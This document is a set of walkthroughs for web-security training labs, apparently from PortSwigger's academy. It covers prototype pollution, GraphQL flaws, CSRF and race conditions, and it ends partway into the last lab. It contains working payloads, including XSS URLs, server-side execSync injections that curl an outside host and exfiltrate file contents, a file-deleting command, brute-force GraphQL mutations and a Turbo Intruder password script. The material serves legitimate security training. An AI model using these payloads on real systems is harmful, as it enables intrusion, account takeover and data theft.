Lab scenario: Client-side prototype pollution via flawed sanitization
Lab Description:
This lab is vulnerable to DOM XSS via client-side prototype pollution. Although the developers have implemented measures to prevent prototype pollution, these can be easily bypassed.
To solve the lab:
Solution Steps: 1.Find a prototype pollution source
2.In your browser, try polluting Object.prototype by injecting an arbitrary property via the query string:
3./?__proto__.foo=bar
4.Open the browser DevTools panel and go to the Console tab.
5.Enter Object.prototype.
6.Study the properties of the returned object and observe that your injected foo property has not been added.
7.Try alternative prototype pollution vectors. For example:
8./?__proto__[foo]=bar
9./?constructor.prototype.foo=bar
10.Observe that in each instance, Object.prototype is not modified.

11.Go to the Sources tab and study the JavaScript files that are loaded by the target site. Notice that deparamSanitized.js uses the sanitizeKey() function defined in searchLoggerFiltered.js to strip potentially dangerous property keys based on a blocklist. However, it does not apply this filter recursively.
12.Back in the URL, try injecting one of the blocked keys in such a way that the dangerous key remains following the sanitization process. For example:
13./?__pro__proto__to__[foo]=bar
14./?__pro__proto__to__.foo=bar
15./?constconstructorructor[protoprototypetype][foo]=bar
16./?constconstructorructor.protoprototypetype.foo=bar

17.In the console, enter Object.prototype again. Notice that it now has its own foo property with the value bar. You've successfully found a prototype pollution source and bypassed the website's key sanitization.
18.Identify a gadget
19.Study the JavaScript files again and notice that searchLogger.js dynamically appends a script to the DOM using the config object's transport_url property if present.
20.Notice that no transport_url property is set for the config object. This is a potential gadget.
21.Craft an exploit
22.Using the prototype pollution source you identified earlier, try injecting an arbitrary transport_url property:
23./?__pro__proto__to__[transport_url]=foo
24.In the browser DevTools panel, go to the Elements tab and study the HTML content of the page. Observe that a <script> element has been rendered on the page, with the src attribute foo.
25.Modify the payload in the URL to inject an XSS proof-of-concept. For example, you can use a data: URL as follows:
26./?__pro__proto__to__[transport_url]=data:,alert(1);
27.Observe that the alert(1) is called and the lab is solved.

Lab scenario: Client-side prototype pollution in third-party libraries
Lab Description:
This lab is vulnerable to DOM XSS via client-side prototype pollution. This is due to a gadget in a third-party library, which is easy to miss due to the minified source code. Although it's technically possible to solve this lab manually, we recommend using DOM Invader as this will save you a considerable amount of time and effort.
To solve the lab:
This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out Widespread prototype pollution gadgets by Gareth Heyes.
Solution Steps: 1.Load the lab in Burp's built-in browser.
2.Enable DOM Invader and enable the prototype pollution option.
3.Open the browser DevTools panel, go to the DOM Invader tab, then reload the page.
4.Observe that DOM Invader has identified two prototype pollution vectors in the hash property i.e. the URL fragment string.
5.Click Scan for gadgets. A new tab opens in which DOM Invader begins scanning for gadgets using the selected source.
6.When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the DOM Invader tab.
7.Observe that DOM Invader has successfully accessed the setTimeout() sink via the hitCallback gadget.
8.Click Exploit. DOM Invader automatically generates a proof-of-concept exploit and calls alert(1).
9.Disable DOM Invader.
10.In the browser, go to the lab's exploit server.
11.In the Body section, craft an exploit that will navigate the victim to a malicious URL as follows:
12.<script>
13.location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
14.</script>
15.Test the exploit on yourself, making sure that you're navigated to the lab's home page and that the alert(document.cookie) payload is triggered.
16.Go back to the exploit server and deliver the exploit to the victim to solve the lab.

Lab scenario: Privilege escalation via server-side prototype pollution
Lab Description:
This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. This is simple to detect because any polluted properties inherited via the prototype chain are visible in an HTTP response.
To solve the lab:
You can log in to your own account with the following credentials: wiener:peter
Solution Steps: 1.Study the address change feature
2.Log in and visit your account page. Submit the form for updating your billing and delivery address.
3.In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.
4.Observe that when you submit the form, the data from the fields is sent to the server as JSON.
5.Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.
6.Send the request to Burp Repeater.
7.Identify a prototype pollution source
8.In Repeater, add a new property to the JSON with the name __proto__, containing an object with an arbitrary property:
10."foo":"bar"
12.Send the request.

13.Notice that the object in the response now includes the arbitrary property that you injected, but no __proto__ property. This strongly suggests that you have successfully polluted the object's prototype and that your property has been inherited via the prototype chain.
14.Identify a gadget
15.Look at the additional properties in the response body.
16.Notice the isAdmin property, which is currently set to false.
17.Craft an exploit
18.Modify the request to try polluting the prototype with your own isAdmin property:
20."isAdmin":true

22.Send the request. Notice that the isAdmin value in the response has been updated. This suggests that the object doesn't have its own isAdmin property, but has instead inherited it from the polluted prototype.
23.In the browser, refresh the page and confirm that you now have a link to access the admin panel.
24.Go to the admin panel and delete carlos to solve the lab.

Lab scenario: Detecting server-side prototype pollution without polluted property reflection
Lab Description:
This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.
To solve the lab, confirm the vulnerability by polluting Object.prototype in a way that triggers a noticeable but non-destructive change in the server's behavior. As this lab is designed to help you practice non-destructive detection techniques, you don't need to progress to exploitation.
You can log in to your own account with the following credentials: wiener:peter
Solution Steps: 1.Note

2.There are a variety of techniques for non-destructively probing for prototype pollution. We'll use the status code override technique for this example, but you can also solve the lab using the charset override or the json spaces override techniques.
3.Study the address change feature
4.Log in and visit your account page. Submit the form for updating your billing and delivery address.
5.In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.

6.Observe that when you submit the form, the data from the fields is sent to the server as JSON. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.
7.Send the request to Burp Repeater.
8.In Repeater, add a new property to the JSON with the name __proto__, containing an object with an arbitrary property:
10."foo":"bar"

12.Send the request. Observe that the object in the response does not reflect the injected property. However, this doesn't necessarily mean that the application isn't vulnerable to prototype pollution.
13.Identify a prototype pollution source
14.In the request, modify the JSON in a way that intentionally breaks the syntax. For example, delete a comma from the end of one of the lines.
15.Send the request. Observe that you receive an error response in which the body contains a JSON error object.
16.Notice that although you received a 500 error response, the error object contains a status property with the value 400.
17.In the request, make the following changes:
18.Fix the JSON syntax by reversing the changes that triggered the error.
19.Modify your injected property to try polluting the prototype with your own distinct status property. Remember that this must be between 400 and 599.
21."status":555
23.Send the request and confirm that you receive the normal response containing your user object.
24.Intentionally break the JSON syntax again and reissue the request.

25.Notice that this time, although you triggered the same error, the status and statusCode properties in the JSON response match the arbitrary error code that you injected into Object.prototype. This strongly suggests that you have successfully polluted the prototype and the lab is solved.

Lab scenario: Bypassing flawed input filters for server-side prototype pollution
Lab Description:
This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.
To solve the lab:
You can log in to your own account with the following credentials: wiener:peter
Solution Steps: 1.Study the address change feature
2.Log in and visit your account page. Submit the form for updating your billing and delivery address.
3.In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.

4.Observe that when you submit the form, the data from the fields is sent to the server as JSON. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.
5.Send the request to Burp Repeater.
6.Identify a prototype pollution source
7.In Repeater, add a new property to the JSON with the name __proto__, containing an object with a json spaces property.
9."json spaces":10
11.Send the request.
12.In the Response panel, switch to the Raw tab. Observe that the JSON indentation appears to be unaffected.
13.Modify the request to try polluting the prototype via the constructor property instead:
14."constructor": {
15."prototype": {
16."json spaces":10
19.Resend the request.

20.In the Response panel, go to the Raw tab. This time, notice that the JSON indentation has increased based on the value of your injected property. This strongly suggests that you have successfully polluted the prototype.
21.Identify a gadget
22.Look at the additional properties in the response body.
23.Notice the isAdmin property, which is currently set to false.
24.Craft an exploit
25.Modify the request to try polluting the prototype with your own isAdmin property:
26."constructor": {
27."prototype": {
28."isAdmin":true

31.Send the request. Notice that the isAdmin value in the response has been updated. This suggests that the object doesn't have its own isAdmin property, but has instead inherited it from the polluted prototype.
32.In the browser, refresh the page and confirm that you now have a link to access the admin panel.
33.Go to the admin panel and delete carlos to solve the lab.

Lab scenario: Remote code execution via server-side prototype pollution
Lab Description:
This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.
Due to the configuration of the server, it's possible to pollute Object.prototype in such a way that you can inject arbitrary system commands that are subsequently executed on the server.
To solve the lab:
In this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: wiener:peter
Solution Steps: 1.Study the address change feature
2.Log in and visit your account page. Submit the form for updating your billing and delivery address.
3.In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.

4.Observe that when you submit the form, the data from the fields is sent to the server as JSON. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.
5.Send the request to Burp Repeater.
6.Identify a prototype pollution source
7.In Repeater, add a new property to the JSON with the name __proto__, containing an object with a json spaces property.
9."json spaces":10
11.Send the request.

12.In the Response panel, switch to the Raw tab. Notice that the JSON indentation has increased based on the value of your injected property. This strongly suggests that you have successfully polluted the prototype.
13.Probe for remote code execution
14.In the browser, go to the admin panel and observe that there's a button for running maintenance jobs.

15.Click the button and observe that this triggers background tasks that clean up the database and filesystem. This is a classic example of the kind of functionality that may spawn node child processes.

16.Try polluting the prototype with a malicious execArgv property that adds the --eval argument to the spawned child process. Use this to call the execSync() sink, passing in a command that triggers an interaction with the public Burp Collaborator server. For example:
18."execArgv":[
19."--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
22.Send the request.
23.In the browser, go to the admin panel and trigger the maintenance jobs again. Notice that these have both failed this time.
24.In Burp, go to the Collaborator tab and poll for interactions. Observe that you have received several DNS interactions, confirming the remote code execution.
25.Craft an exploit
26.In Repeater, replace the curl command with a command for deleting Carlos's file:
28."execArgv":[
29."--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
32.Send the request.
33.Go back to the admin panel and trigger the maintenance jobs again. Carlos's file is deleted and the lab is solved.

Lab scenario: Exfiltrating sensitive data via server-side prototype pollution
Lab Description:
This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.
Due to the configuration of the server, it's possible to pollute Object.prototype in such a way that you can inject arbitrary system commands that are subsequently executed on the server.
To solve the lab:
In this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: wiener:peter
Solution Steps: 1.Study the address change feature
2.Log in and visit your account page. Submit the form for updating your billing and delivery address.
3.In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.

4.Observe that when you submit the form, the data from the fields is sent to the server as JSON. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.
5.Send the request to Burp Repeater.
6.Identify a prototype pollution source
7.In Repeater, add a new property to the JSON with the name __proto__, containing an object with a json spaces property.
9."json spaces":10
11.Send the request.

12.In the Response panel, switch to the Raw tab. Notice that the JSON indentation has increased based on the value of your injected property. This strongly suggests that you have successfully polluted the prototype.
13.Probe for remote code execution
14.Go to the admin panel and observe that there's a button for running maintenance jobs.

15.Click the button and observe that this triggers background tasks that cleanup the database and filesystem. This is a classic example of the kind of functionality that may spawn node child processes.

16.Try polluting the prototype with a set of malicious properties that control the options passed to the child_process.execSync() method. The injected command should trigger an interaction with the public Burp Collaborator server:
18."shell":"vim",
19."input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
21.Send the request.
22.In the browser, go to the admin panel and trigger the maintenance jobs. Observe that, after a short delay, these fail to run.
23.In Burp, go to the Collaborator tab and poll for interactions. Observe that you have received several interactions. This confirms the remote code execution.
24.Leak the hidden file name

25.In Burp Repeater, modify the payload in your malicious input parameter to a command that leaks the contents of Carlos's home directory to the public Burp Collaborator server. The following is one approach for doing this:
26."input":":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
27.Send the request.
28.In the browser, go to the admin panel and trigger the maintenance jobs again.
29.Go to the Collaborator tab and poll for interactions.
30.Notice that you have received a new HTTP POST request with a Base64-encoded body.
31.Decode the contents of the body to reveal the names of two entries: node_apps and secret.
32.Exfiltrate the contents of the secret file

33.In Burp Repeater, modify the payload in your malicious input parameter to a command that exfiltrates the contents of the file /home/carlos/secret to the public Burp Collaborator server. The following is one approach for doing this:
34."input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
35.Send the request.
36.In the browser, go to the admin panel and trigger the maintenance jobs again.
37.Go to the Collaborator tab and poll for interactions.
38.Notice that you have received a new HTTP POST request with a Base64-encoded body.
39.Decode the contents of the body to reveal the secret.
40.In your browser, go to the lab banner and click Submit solution. Submit the decoded secret to solve the lab.

Lab scenario: Accessing private GraphQL posts
Lab Description:
The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password.
Learn more about Working with GraphQL in Burp Suite.
Solution Steps: 1.Identify the vulnerability
2.In Burp's browser, access the blog page.
3.In Burp, go to Proxy > HTTP history and notice the following:
4.Blog posts are retrieved using a GraphQL query.
5.In the response to the GraphQL query, each blog post has its own sequential id.
6.Blog post id 3 is missing from the list. This indicates that there is a hidden blog post.
7.Find the POST /graphql/v1 request. Right-click it and select Send to Repeater.
8.In Repeater, right-click anywhere in the Request panel of the message editor and select GraphQL > Set introspection query to insert an introspection query into the request body.
9.Send the request. Notice in the response that the BlogPost type has a postPassword field available.
10.Exploit the vulnerability to find the password
11.In the HTTP history, find the POST /graphql/v1 request. Right-click it and select Send to Repeater.
12.In Repeater, click on the GraphQL tab. In the Variables panel, modify the id variable to 3 (the ID of the hidden blog post).
13.In the Query panel, add the postPassword field to the query.
14.Send the request.
15.Copy the contents of the response's postPassword field and paste them into the Submit solution dialog to solve the lab. You may need to refresh the page.

Lab scenario: Accidental exposure of private GraphQL fields
Lab Description:
The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.
To solve the lab, sign in as the administrator and delete the username carlos.
Learn more about Working with GraphQL in Burp Suite.
Solution Steps: 1.Identify the vulnerability
2.In Burp's browser, access the lab and select My account.
3.Attempt to log in to the site.
4.In Burp, go to Proxy > HTTP history and notice that the login attempt is sent as a GraphQL mutation containing a username and password.
5.Right-click the login request and select Send to Repeater.
6.In Repeater, right-click anywhere within the Request panel of the message editor and select GraphQL > Set introspection query to insert an introspection query into the request body.
7.Send the request.
8.Right-click the message and select GraphQL > Save GraphQL queries to site map.
9.Go to Target > Site map and review the GraphQL queries. Notice the following:
10.There is a getUser query that returns a user's username and password.
11.This query fetches the relevant user information via a direct reference to an id number.
12.Modify the query to retrieve the administrator credentials
13.Right-click the the getUser query and select Send to Repeater.
14.In Repeater, click Send. Notice that the default id value of 0 doesn't return a user.
15.Select the GraphQL tab and test alternative values for the id variable until the API returns the administrator's credentials. In this case, the administrator's ID is 1.
16.Log in to the site as the administrator, go to the Admin panel, and delete carlos to solve the lab.

Lab scenario: Finding a hidden GraphQL endpoint
Lab Description:
The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.
To solve the lab, find the hidden endpoint and delete carlos.
Learn more about Working with GraphQL in Burp Suite.
Solution Steps: 1.Find the hidden GraphQL endpoint
2.In Repeater, send requests to some common GraphQL endpoint suffixes and inspect the results.
3.Note that when you send a GET request to /api the response contains a "Query not present" error. This hints that there may be a GraphQL endpoint responding to GET requests at this location.
4.Amend the request to contain a universal query. Note that, because the endpoint is responding to GET requests, you need to send the query as a URL parameter.
5.For example: /api?query=query{__typename}.
6.Notice that the response confirms that this is a GraphQL endpoint:
8."data": {
9."__typename": "query"
12.Overcome the introspection defenses
13.Send a new request with a URL-encoded introspection query as a query parameter.
14.To do this, right-click the request and select GraphQL > Set introspection query:

15./api?query=query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
16.Notice from the response that introspection is disallowed.
17.Modify the query to include a newline character after __schema and resend.
18.For example:

19./api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A

20.Notice that the response now includes full introspection details. This is because the server is configured to exclude queries matching the regex "__schema{", which the query no longer matches even though it is still a valid introspection query.
21.Exploit the vulnerability to delete carlos
22.Right-click the request and select GraphQL > Save GraphQL queries to site map.
23.Go to Target > Site map to see the API queries. Use the GraphQL tab and find the getUser query. Right-click the request and select Send to Repeater.
24.In Repeater, send the getUser query to the endpoint you discovered.
25.Notice that the response returns:
28."getUser": null
31.Click on the GraphQL tab and change the id variable to find carlos's user ID. In this case, the relevant user ID is 3.
32.In Target > Site map, browse the schema again and find the deleteOrganizationUser mutation. Notice that this mutation takes a user ID as a parameter.
33.Send the request to Repeater.
34.In Repeater, send a deleteOrganizationUser mutation with a user ID of 3 to delete carlos and solve the lab.
35.For example:
36./api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D

Lab scenario: Bypassing GraphQL brute force protections
Lab Description:
The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.
To solve the lab, brute force the login mechanism to sign in as carlos. Use the list of authentication lab passwords as your password source.
Learn more about Working with GraphQL in Burp Suite.
Solution Steps: 1.In Burp's browser, access the lab and select My account.
2.Attempt to log in to the site using incorrect credentials.
3.In Burp, go to Proxy > HTTP history. Note that login requests are sent as  a GraphQL mutation.
4.Right-click the login request and select Send to Repeater.
5.In Repeater, attempt some further login requests with incorrect credentials. Note that after a short period of time the API starts to return a rate limit error.
6.In the GraphQL tab, craft a request that uses aliases to send multiple login mutations in one message. See the tip in this lab for a method that makes this process less time-consuming.
7.Bear the following in mind when constructing your request:
8.The list of aliases should be contained within a mutation {} type.
9.Each aliased mutation should have the username carlos and a different password from the authentication list.
10.If you are modifying the request that you sent to Repeater, delete the variable dictionary and operationName field from the request before sending. You can do this from Repeater's Pretty tab.
11.Ensure that each alias requests the success field, as shown in the simplified example below:
12.mutation {
13.bruteforce0:login(input:{password: "123456", username: "carlos"}) {
14.token
15.success
17.bruteforce1:login(input:{password: "password", username: "carlos"}) {
18.token
19.success
22.bruteforce99:login(input:{password: "12345678", username: "carlos"}) {
23.token
24.success
27.Click Send.
28.Notice that the response lists each login attempt and whether its login attempt was successful.
29.Use the search bar below the response to search for the string true. This indicates which of the aliased mutations was able to successfully log in as carlos.
30.Check the request for the password that was used by the successful alias.
31.Log in to the site using the carlos credentials to solve the lab.

Lab scenario: Performing CSRF exploits over GraphQL
Lab Description:
The user management functions for this lab are powered by a GraphQL endpoint. The endpoint accepts requests with a content-type of x-www-form-urlencoded and is therefore vulnerable to cross-site request forgery (CSRF) attacks.
To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address, then upload it to your exploit server.
You can log in to your own account using the following credentials: wiener:peter.
Learn more about Working with GraphQL in Burp Suite.
Solution Steps: 1.Open Burp's browser, access the lab and log in to your account.
2.Enter a new email address, then click Update email.
3.In Burp, go to Proxy > HTTP history and check the resulting request. Note that the email change is sent as a GraphQL mutation.
4.Right-click the email change request and select Send to Repeater.
5.In Repeater, amend the GraphQL query to change the email to a second different address.
6.Click Send.
7.In the response, notice that the email has changed again. This indicates that you can reuse a session cookie to send multiple requests.
8.Convert the request into a POST request with a Content-Type of x-www-form-urlencoded. To do this, right-click the request and select Change request method twice.
9.Notice that the mutation request body has been deleted. Add the request body back in with URL encoding.
10.The body should look like the below:

11.query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
12.Right-click the request and select Engagement tools > Generate CSRF PoC. Burp displays the CSRF PoC generator dialog.

13.Amend the HTML in the CSRF PoC generator dialog so that it changes the email a third time. This step is necessary because otherwise the exploit won't make any changes to the current email address at the time it is run. Likewise, if you test the exploit before delivering, make sure that you change the email from whatever it is currently set to before delivering to the victim.
14.Copy the HTML.
15.In the lab, click Go to exploit server.
16.Paste the HTML into the exploit server and click Deliver exploit to victim to solve the lab.

Lab scenario: Limit overrun race conditions
Lab Description:
This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.
To solve the lab, successfully purchase a Lightweight L33t Leather Jacket.
You can log in to your account with the following credentials: wiener:peter.
Solution Steps: 1.Predict a potential collision
2.Log in and buy the cheapest item possible, making sure to use the provided discount code so that you can study the purchasing flow.
3.Consider that the shopping cart mechanism and, in particular, the restrictions that determine what you are allowed to order, are worth trying to bypass.

4.In Burp, from the proxy history, identify all endpoints that enable you to interact with the cart. For example, a POST /cart request adds items to the cart and a POST /cart/coupon request applies the discount code.
5.Try to identify any restrictions that are in place on these endpoints. For example, observe that if you try applying the discount code more than once, you receive a Coupon already applied response.
6.Make sure you have an item to your cart, then send the GET /cart request to Burp Repeater.
7.In Repeater, try sending the GET /cart request both with and without your session cookie. Confirm that without the session cookie, you can only access an empty cart. From this, you can infer that:
8.The state of the cart is stored server-side in your session.
9.Any operations on the cart are keyed on your session ID or the associated user ID.
10.This indicates that there is potential for a collision.
11.Consider that there may be a race window between when you first apply a discount code and when the database is updated to reflect that you've done this already.
12.Benchmark the behavior
13.Make sure there is no discount code currently applied to your cart.
14.Send the request for applying the discount code (POST /cart/coupon) to Repeater.
15.In Repeater, add the new tab to a group. For details on how to do this, see Creating a new tab group.
16.Right-click the grouped tab, then select Duplicate tab. Create 19 duplicate tabs. The new tabs are automatically added to the group.
17.Send the group of requests in sequence, using separate connections to reduce the chance of interference. For details on how to do this, see Sending requests in sequence.
18.Observe that the first response confirms that the discount was successfully applied, but the rest of the responses consistently reject the code with the same Coupon already applied message.
19.Probe for clues
20.Remove the discount code from your cart.

21.In Repeater, send the group of requests again, but this time in parallel, effectively applying the discount code multiple times at once. For details on how to do this, see Sending requests in parallel.
22.Study the responses and observe that multiple requests received a response indicating that the code was successfully applied. If not, remove the code from your cart and repeat the attack.
23.In the browser, refresh your cart and confirm that the 20% reduction has been applied more than once, resulting in a significantly cheaper order.
24.Prove the concept
25.Remove the applied codes and the arbitrary item from your cart and add the leather jacket to your cart instead.
26.Resend the group of POST /cart/coupon requests in parallel.
27.Refresh the cart and check the order total:
28.If the order total is still higher than your remaining store credit, remove the discount codes and repeat the attack.
29.If the order total is less than your remaining store credit, purchase the jacket to solve the lab.

Lab scenario: Bypassing rate limits via race conditions
Lab Description:
This lab's login mechanism uses rate limiting to defend against brute-force attacks. However, this can be bypassed due to a race condition.
To solve the lab:
You can log in to your account with the following credentials: wiener:peter.
You should use the following list of potential passwords:
Solution Steps: 1.Predict a potential collision
2.Experiment with the login function by intentionally submitting incorrect passwords for your own account.
3.Observe that if you enter the incorrect password more than three times, you're temporarily blocked from making any more login attempts for the same account.

4.Try logging in using another arbitrary username and observe that you see the normal Invalid username or password message. This indicates that the rate limit is enforced per-username rather than per-session.
5.Deduce that the number of failed attempts per username must be stored server-side.
6.Consider that there may be a race window between:
7.When you submit the login attempt.
8.When the website increments the counter for the number of failed login attempts associated with a particular username.
9.Benchmark the behavior
10.From the proxy history, find a POST /login request containing an unsuccessful login attempt for your own account.
11.Send this request to Burp Repeater.
12.In Repeater, add the new tab to a group. For details on how to do this, see Creating a new tab group.
13.Right-click the grouped tab, then select Duplicate tab. Create 19 duplicate tabs. The new tabs are automatically added to the group.
14.Send the group of requests in sequence, using separate connections to reduce the chance of interference. For details on how to do this, see Sending requests in sequence.
15.Observe that after two more failed login attempts, you're temporarily locked out as expected.
16.Probe for clues
17.Send the group of requests again, but this time in parallel. For details on how to do this, see Sending requests in parallel
18.Study the responses. Notice that although you have triggered the account lock, more than three requests received the normal Invalid username and password response.
19.Infer that if you're quick enough, you're able to submit more than three login attempts before the account lock is triggered.
20.Prove the concept
21.Still in Repeater, highlight the value of the password parameter in the POST /login request.
22.Right-click and select Extensions > Turbo Intruder > Send to turbo intruder.
23.In Turbo Intruder, in the request editor, notice that the value of the password parameter is automatically marked as a payload position with the %s placeholder.
24.Change the username parameter to carlos.
25.From the drop-down menu, select the examples/race-single-packet-attack.py template.
26.In the Python editor, edit the template so that your attack queues the request once using each of the candidate passwords. For simplicity, you can copy the following example:
27.def queueRequests(target, wordlists):
28.# as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
29.engine = RequestEngine(endpoint=target.endpoint,
30.concurrentConnections=1,
31.engine=Engine.BURP2
33.# assign the list of candidate passwords from your clipboard
34.passwords = wordlists.clipboard
35.# queue a login request using each password from the wordlist
36.# the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
37.for password in passwords:
38.engine.queue(target.req, password, gate='1')
39.# once every request has been queued
40.# invoke engine.openGate() to send all requests in the given gate simultaneously
41.engine.openGate('1')
42.def handleResponse(req, interesting):
43.table.add(req)
44.Note that we're assigning the password list from the clipboard by referencing wordlists.clipboard. Copy the list of candidate passwords to your clipboard.
45.Launch the attack.
46.Study the responses.
47.If you have no successful logins, wait for the account lock to reset and then repeat the attack. You might want to remove any passwords from the list that you know are incorrect.
48.If you get a 302 response, notice that this login appears to be successful. Make a note of the corresponding password from the Payload column.
49.Wait for the account lock to reset, then log in as carlos using the identified password.
50.Access the admin panel and delete the user carlos to solve the lab.

Lab scenario: Multi-endpoint race conditions
Lab Description:
This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.
To solve the lab, successfully purchase a Lightweight L33t Leather Jacket.
You can log into your account with the following credentials: wiener:peter.
Solution Steps: 1.Predict a potential collision
2.Log in and purchase a gift card so you can study the purchasing flow.
3.Consider that the shopping cart mechanism and, in particular, the restrictions that determine what you are allowed to order, are worth trying to bypass.

